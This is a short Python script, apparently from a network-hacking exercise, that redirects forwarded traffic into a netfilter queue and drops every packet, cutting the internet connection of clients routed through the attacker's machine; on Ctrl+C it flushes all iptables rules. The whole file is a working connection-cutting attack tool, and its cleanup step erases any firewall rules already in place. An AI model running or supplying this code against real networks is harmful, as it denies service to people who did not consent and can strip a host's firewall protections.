#!/usr/bin/env python3

# @Author - Avish Dhirawat
# Date - 13/08/2020

import netfilterqueue
import subprocess

subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell = True)

def process_packet(packet):
    print("[+] Cutting the internet connection........")
    print(packet)
    #packet.accept() # Used to forward the packets to the client
    packet.drop() # Cut the internet connection of the client

try:
    queue = netfilterqueue.NetfilterQueue()
    # iptables -I FORWARD -j NFQUEUE --queue-num 0
    queue.bind(0, process_packet) # 0 is queue number/id that we given in above command while storing the iptable to a queue.
    queue.run()

except KeyboardInterrupt:
    print("[-] Detected CTRL + C .... Exiting.....")
    # iptables --flush to delete the iptables we created
    subprocess.call("iptables --flush", shell = True)
